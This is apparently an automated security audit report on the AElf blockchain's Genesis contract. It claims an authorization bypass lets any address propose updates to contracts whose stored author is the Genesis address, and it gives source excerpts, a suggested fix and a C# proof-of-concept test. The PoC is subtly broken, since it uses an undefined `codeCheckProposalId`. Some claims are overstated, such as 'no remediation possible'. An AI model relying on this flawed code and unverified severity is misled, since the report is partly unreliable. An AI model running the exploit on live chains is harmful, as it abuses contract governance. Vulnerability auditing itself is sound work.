# Audit Report

## Title
Authorization Bypass in Contract Update Proposals via Context.Self Author Field

## Summary
The `AssertAuthorityByContractInfo` function contains a critical authorization logic flaw that allows any user to propose updates to contracts whose author field is set to the Genesis contract address (`Context.Self`). This affects all contracts deployed by non-whitelisted proposers, completely bypassing the intended restriction that only contract authors can propose updates.

## Finding Description

The vulnerability exists in the authorization check performed during contract update proposals. [1](#0-0) 

The authorization check is implemented in `AssertAuthorityByContractInfo`: [2](#0-1) 

**Root Cause:**

The condition `contractInfo.Author == Context.Self || address == contractInfo.Author` conflates two distinct security checks:
1. Whether the contract's **stored author field** equals the Genesis contract address (state value)
2. Whether the **current caller** is the Genesis contract (execution context)

When a contract has `Author = Context.Self` (stored state), the first condition is ALWAYS true regardless of who is calling. This bypasses all authorization.

**The intended logic should be:**
- `Context.Sender == Context.Self` (caller IS Genesis) OR `Context.Sender == contractInfo.Author` (caller IS author)

**But the actual logic is:**
- `contractInfo.Author == Context.Self` (author FIELD is Genesis) OR `Context.Sender == contractInfo.Author` (caller IS author)

**How Contracts Get Author=Context.Self:**

During contract deployment, the author is determined by `DecideNonSystemContractAuthor`: [3](#0-2) 

When the proposer is not in the deployment whitelist, this function returns `Context.Self` (line 265), causing the contract's author to be set to the Genesis contract address.

This behavior is confirmed by tests: [4](#0-3) 

The deployment process that sets this author occurs at: [5](#0-4) 

**Comparison with Intended Behavior:**

The system correctly rejects unauthorized update proposals for contracts with normal authors: [6](#0-5) 

However, this protection fails for contracts with `Author=Context.Self` because the authorization check doesn't validate who is making the call.

## Impact Explanation

**Authorization Bypass:**
Any user can call `ProposeUpdateContract` on contracts with `Author=Context.Self`, completely bypassing the intended author-only restriction. While governance must still approve the actual update, the proposal stage represents a critical authorization boundary that is completely broken.

**Affected Contracts:**
All contracts deployed when proposers were not in the deployment controller's whitelist have `Author=Context.Self` and are permanently vulnerable. This is a normal operational scenario, not an edge case.

**Attack Vectors:**
1. **Governance DoS:** Attackers can flood the governance system with malicious update proposals for vulnerable contracts, consuming resources and creating confusion
2. **Loss of Author Control:** Legitimate contract authors lose exclusive control over their contract's update lifecycle, as anyone can now propose updates
3. **Governance Exploitation:** If governance approval thresholds are weak or compromised, malicious code updates could be pushed through proposals that should never have been created
4. **Reputation Damage:** Contract owners cannot prevent unauthorized parties from proposing updates to their contracts

**Severity Justification:**
This violates the fundamental access control invariant that only contract authors should propose updates to their contracts. The flaw affects an entire class of legitimately deployed contracts with no remediation possible.

## Likelihood Explanation

**Attack Requirements:**
- No special permissions required
- Any address can call the public method `ProposeUpdateContract`
- No economic barriers beyond standard transaction fees
- Target contracts exist by design in normal operations

**Attack Simplicity:**
- Single transaction exploit with no complex setup
- No race conditions or timing dependencies
- Simply call `ProposeUpdateContract` with any contract address that has `Author=Context.Self`

**Preconditions:**
- Contracts with `Author=Context.Self` are created whenever non-whitelisted proposers deploy contracts
- This is standard operational behavior encoded in the deployment logic
- The vulnerable authorization check executes on every update proposal

**Probability:**
High - The vulnerability is deterministic and affects all contracts where the proposer was not whitelisted during deployment, which is an intentional system design pattern.

## Recommendation

Fix the `AssertAuthorityByContractInfo` function to check whether the **caller** is the Genesis contract, not whether the **author field** contains the Genesis address:

```csharp
private void AssertAuthorityByContractInfo(ContractInfo contractInfo, Address address)
{
    Assert(address == Context.Self || address == contractInfo.Author, "No permission.");
}
```

This ensures that:
1. If the **caller** (`address` parameter) is the Genesis contract (`Context.Self`), authorization passes
2. If the **caller** matches the contract's author, authorization passes
3. Otherwise, authorization is denied

This correctly validates the caller's identity rather than checking a stored state value.

## Proof of Concept

```csharp
[Fact]
public async Task ProposeUpdateContract_AuthBypass_Test()
{
    // Deploy a contract through governance (Author will be BasicContractZeroAddress)
    var contractDeploymentInput = new ContractDeploymentInput
    {
        Category = KernelConstants.DefaultRunnerCategory,
        Code = ByteString.CopyFrom(Codes.Single(kv => kv.Key.Contains("TokenConverter")).Value)
    };

    var proposingTxResult = await Tester.ExecuteContractWithMiningAsync(BasicContractZeroAddress,
        nameof(BasicContractZero.ProposeNewContract), contractDeploymentInput);

    var proposedContractInputHash = ContractProposed.Parser
        .ParseFrom(proposingTxResult.Logs.First(l => l.Name.Contains(nameof(ContractProposed))).NonIndexed)
        .ProposedContractInputHash;

    // Complete the deployment process (approve and release)
    var contractProposalId = ProposalCreated.Parser
        .ParseFrom(proposingTxResult.Logs.First(l => l.Name.Contains(nameof(ProposalCreated))).NonIndexed)
        .ProposalId;

    await ApproveWithMinersAsync(Tester, ParliamentAddress, contractProposalId);
    
    await Tester.ExecuteContractWithMiningAsync(BasicContractZeroAddress,
        nameof(BasicContractZero.ReleaseApprovedContract), new ReleaseContractInput
        {
            ProposalId = contractProposalId,
            ProposedContractInputHash = proposedContractInputHash
        });

    // Get deployed contract address
    var deploymentResult = await Tester.ExecuteContractWithMiningAsync(BasicContractZeroAddress,
        nameof(BasicContractZeroImplContainer.BasicContractZeroImplStub.ReleaseCodeCheckedContract),
        new ReleaseContractInput { ProposedContractInputHash = proposedContractInputHash, ProposalId = codeCheckProposalId });

    var deployAddress = ContractDeployed.Parser
        .ParseFrom(deploymentResult.Logs.First(l => l.Name.Contains(nameof(ContractDeployed))).NonIndexed)
        .Address;

    // Verify author is BasicContractZeroAddress
    var author = Address.Parser.ParseFrom(await Tester.CallContractMethodAsync(BasicContractZeroAddress,
        nameof(BasicContractZeroImplContainer.BasicContractZeroImplStub.GetContractAuthor), deployAddress));
    author.ShouldBe(BasicContractZeroAddress);

    // EXPLOIT: Unauthorized user can propose update
    var unauthorizedUpdateTx = await Tester.GenerateTransactionAsync(BasicContractZeroAddress,
        nameof(BasicContractZero.ProposeUpdateContract), AnotherMinerKeyPair, new ContractUpdateInput
        {
            Address = deployAddress,
            Code = ByteString.CopyFrom(Codes.Single(kv => kv.Key.Contains("Profit")).Value)
        });
    
    var blockReturnSet = await Tester.MineAsync(new List<Transaction> { unauthorizedUpdateTx });
    var updateTxResult = blockReturnSet.TransactionResultMap[unauthorizedUpdateTx.GetHash()];
    
    // VULNERABILITY: This should fail with "No permission" but SUCCEEDS
    updateTxResult.Status.ShouldBe(TransactionResultStatus.Mined); // Bypasses authorization!
}
```

**Notes:**

The vulnerability is confirmed through code analysis showing that `AssertAuthorityByContractInfo` incorrectly checks the stored author field value instead of validating the caller's identity. This creates a permanent authorization bypass for all contracts deployed by non-whitelisted proposers, which is a standard operational scenario in the AElf contract deployment system.

### Citations

**File:** contract/AElf.Contracts.Genesis/BasicContractZero.cs (L175-183)
```csharp
    public override Hash ProposeUpdateContract(ContractUpdateInput input)
    {
        var proposedContractInputHash = CalculateHashFromInput(input);
        RegisterContractProposingData(proposedContractInputHash);

        var contractAddress = input.Address;
        var info = State.ContractInfos[contractAddress];
        Assert(info != null, "Contract not found.");
        AssertAuthorityByContractInfo(info, Context.Sender);
```

**File:** contract/AElf.Contracts.Genesis/BasicContractZero.cs (L309-322)
```csharp
    public override Address DeploySmartContract(ContractDeploymentInput input)
    {
        RequireSenderAuthority(State.CodeCheckController.Value?.OwnerAddress);
        // AssertDeploymentProposerAuthority(Context.Origin);

        var inputHash = CalculateHashFromInput(input);
        TryClearContractProposingData(inputHash, out var contractProposingInput);

        var address =
            DeploySmartContract(null, input.Category, input.Code.ToByteArray(), false,
                DecideNonSystemContractAuthor(contractProposingInput?.Proposer, Context.Sender), false,
                input.ContractOperation?.Deployer, input.ContractOperation?.Salt);
        return address;
    }
```

**File:** contract/AElf.Contracts.Genesis/BasicContractZero_Helper.cs (L241-244)
```csharp
    private void AssertAuthorityByContractInfo(ContractInfo contractInfo, Address address)
    {
        Assert(contractInfo.Author == Context.Self || address == contractInfo.Author, "No permission.");
    }
```

**File:** contract/AElf.Contracts.Genesis/BasicContractZero_Helper.cs (L257-266)
```csharp
    private Address DecideNonSystemContractAuthor(Address proposer, Address sender)
    {
        if (!State.ContractDeploymentAuthorityRequired.Value)
            return sender;

        var contractDeploymentController = State.ContractDeploymentController.Value;
        var isProposerInWhiteList = ValidateProposerAuthority(contractDeploymentController.ContractAddress,
            contractDeploymentController.OwnerAddress, proposer);
        return isProposerInWhiteList ? proposer : Context.Self;
    }
```

**File:** test/AElf.Contracts.Genesis.Tests/GenesisContractAuthTest.cs (L822-837)
```csharp
        var creator = ContractDeployed.Parser
            .ParseFrom(deploymentResult.Logs.First(l => l.Name.Contains(nameof(ContractDeployed))).Indexed[0])
            .Author;

        creator.ShouldBe(BasicContractZeroAddress);

        var deployAddress = ContractDeployed.Parser
            .ParseFrom(deploymentResult.Logs.First(l => l.Name.Contains(nameof(ContractDeployed))).NonIndexed)
            .Address;

        deployAddress.ShouldNotBeNull();

        var author = Address.Parser.ParseFrom(await Tester.CallContractMethodAsync(BasicContractZeroAddress,
            nameof(BasicContractZeroImplContainer.BasicContractZeroImplStub.GetContractAuthor), deployAddress));

        author.ShouldBe(BasicContractZeroAddress);
```

**File:** test/AElf.Contracts.Genesis.Tests/GenesisContractAuthTest.cs (L1176-1187)
```csharp
            var noPermissionProposingTx = await SideChainTester.GenerateTransactionAsync(SideBasicContractZeroAddress,
                nameof(BasicContractZero.ProposeUpdateContract), AnotherMinerKeyPair, new ContractUpdateInput
                {
                    Address = deployAddress,
                    Code = ByteString.Empty
                });
            var blockReturnSet = await SideChainTester.MineAsync(new List<Transaction> { noPermissionProposingTx });
            var noPermissionProposingTxResult =
                blockReturnSet.TransactionResultMap[noPermissionProposingTx.GetHash()];
            noPermissionProposingTxResult.Status.ShouldBe(TransactionResultStatus.Failed);
            noPermissionProposingTxResult.Error.ShouldContain("No permission.");
        }
```
